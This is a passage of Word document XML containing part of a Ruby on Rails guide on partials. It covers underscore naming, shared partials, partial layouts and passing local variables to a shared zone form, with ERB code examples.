        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="384F9290" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This will render a file named </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_menu.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> at that point within the view being rendered. Note the leading underscore character: partials are named with a leading underscore to distinguish them from regular views, even though they are referred to without the underscore. This holds true even when you’re pulling in a partial from another folder:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3168"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="74E1B0B6" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5FB66F88" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="740517629"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%= render "shared/menu"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="11451D12" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">That code will pull in the partial from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/views/shared/_menu.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23790532" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>3.4.2 Using Partials to Simplify Views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74C917D7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>One way to use partials is to treat them as the equivalent of subroutines: as a way to move details out of a view so that you can grasp what’s going on more easily. For example, you might have a view that looked like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="0BCEFC81" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="61A49AA6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render "shared/ad_banner"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02CDC2C7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2AB5F20F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;h1&gt;Products&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2113F1E9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15343490" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;p&gt;Here are a few of our fine products:&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0ED145A4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D696971" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FFEC4C2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render "shared/footer"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1EB992EB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Here, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_ad_banner.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_footer.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> partials could contain content that is shared among many pages in your application. You don’t need to see the details of these sections when you’re concentrating on a particular page.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="504601BC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>For content that is shared among all pages in your application, you can use partials directly from layouts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28BD6443" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>3.4.3 Partial Layouts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04BC2573" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>A partial can use its own layout file, just as a view can use a layout. For example, you might call a partial like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6790"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="22A53654" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="40F56EB7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1848010720"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :partial</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "link_area", :layout</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "graybar"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3721F1CF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This would look for a partial named </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_link_area.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and render it using the layout </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_graybar.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Note that layouts for partials follow the same leading-underscore naming as regular partials, and are placed in the same folder with the partial that they belong to (not in the master </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>layouts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> folder).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C465C01" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Also note that explicitly specifying </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:partial</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is required when passing additional options such as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:layout</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="224468FC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>3.4.4 Passing Local Variables</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="357C3E20" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You can also pass local variables into partials, making them even more powerful and flexible. For example, you can use this technique to reduce duplication between new and edit pages, while still keeping a bit of distinct content:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A681C66" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="75"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>new.html.erb</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7198"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="0539FC94" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="07167FE7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;h1&gt;New zone&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0535645D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>error_messages_for :zone</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C57F409" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :partial</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "form", :locals</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; { :zone</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; @zone</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>} %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1C9B5E42" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="76"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>edit.html.erb</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7198"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="6D442E83" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0F7BCF10" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;h1&gt;Editing zone&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BC35E6C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>error_messages_for :zone</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="310A2542" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :partial</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "form", :locals</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; { :zone</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; @zone</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>} %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6BB95A1D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="77"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_form.html.erb</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3815"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="56D24409" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="40C2F48F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>form_for(zone) do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|f| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="122CECB1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6080F480" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    &lt;b&gt;Zone name&lt;/b&gt;&lt;br</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>/&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E30C72A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    &lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>f.text_field :name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="405568FB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27A92D0B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2031B9E4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    &lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>f.submit %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EB530D4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="781EF60D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5B88FC16" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Although the same partial will be rendered into both views, Action View’s submit helper will return “Create Zone” for the new action and “Update Zone” for the edit action.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="313BCAA2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
